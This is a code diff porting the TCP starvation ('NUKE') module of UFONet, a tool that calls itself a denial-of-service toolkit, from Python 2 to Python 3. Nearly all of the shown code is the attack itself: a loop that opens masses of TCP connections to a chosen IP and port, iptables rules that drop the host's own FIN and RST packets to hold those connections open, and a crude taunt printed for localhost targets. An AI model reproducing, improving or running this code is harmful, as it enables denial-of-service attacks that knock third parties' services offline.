@@ -1,13 +1,19 @@
-#!/usr/bin/env python 
+#!/usr/bin/env python3 
 # -*- coding: utf-8 -*-"
 """
-UFONet - Denial of Service Toolkit - 2019 - by psy (epsylon@riseup.net)
+This file is part of the UFONet project, https://ufonet.03c8.net
+
+Copyright (c) 2013/2020 | psy <epsylon@riseup.net>
 
 You should have received a copy of the GNU General Public License along
 with UFONet; if not, write to the Free Software Foundation, Inc., 51
 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
-import socket, select, os, time, urlparse, resource
+import socket, select, os, time, resource
+try:
+    from urlparse import urlparse
+except:
+    from urllib.parse import urlparse
 
 # UFONet TCP Starvation (NUKE)
 def connect(ip, port):
@@ -28,22 +34,11 @@ def nukeize(ip, port, rounds):
             try:
                 n=n+1
                 s = connect(ip, port)
-                print "[Info] [AI] [NUKE] Firing 'nuke' ["+str(n)+"] -> [SHOCKING!]"
+                print("[Info] [AI] [NUKE] Firing 'nuke' ["+str(n)+"] -> [SHOCKING!]")
                 connections[s.fileno()] = s 
                 epoll.register(s.fileno(), select.EPOLLOUT|select.EPOLLONESHOT)
-                while True:
-                    n=n+1
-                    events = epoll.poll(1)
-                    for fileno, event in events:
-                        s = connections.pop(s.fileno())
-                        print "[Info] [AI] [NUKE] Firing 'nuke' ["+str(n)+"] -> [SHOCKING!]"
-                        if s:
-                            s.close()
-                            s = connect(ip, port)
-                            connections[s.fileno()] = s
-                            epoll.register(s.fileno(), select.EPOLLOUT|select.EPOLLONESHOT)                
             except:
-                print "[Error] [AI] [NUKE] Failed to engage with 'nuke' ["+str(n)+"]"
+                print("[Error] [AI] [NUKE] Failed to engage with 'nuke' ["+str(n)+"]")
         os.system('iptables -D OUTPUT -d %s -p tcp --dport %d --tcp-flags FIN FIN -j DROP' %(ip, port)) # restore IPTABLES
         os.system('iptables -D OUTPUT -d %s -p tcp --dport %d --tcp-flags RST RST -j DROP' %(ip, port))
     except:
@@ -51,7 +46,7 @@ def nukeize(ip, port, rounds):
 
 class NUKE(object):
     def attacking(self, target, rounds):
-        print "[Info] [AI] TCP Starvation (NUKE) is ready to fire: [" , rounds, "nukes ]"
+        print("[Info] [AI] TCP Starvation (NUKE) is ready to fire: [" , rounds, "nukes ]")
         if target.startswith('http://'):
             target = target.replace('http://','')
             port = 80
@@ -72,6 +67,6 @@ class NUKE(object):
             except:
                 ip = target
         if ip == "127.0.0.1" or ip == "localhost":
-            print "[Info] [AI] [NUKE] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n"
+            print("[Info] [AI] [NUKE] Sending message '1/0 %====D 2 Ur ;-0' to 'localhost' -> [OK!]\n")
             return
         nukeize(ip, port, rounds) # attack with NUKE using threading
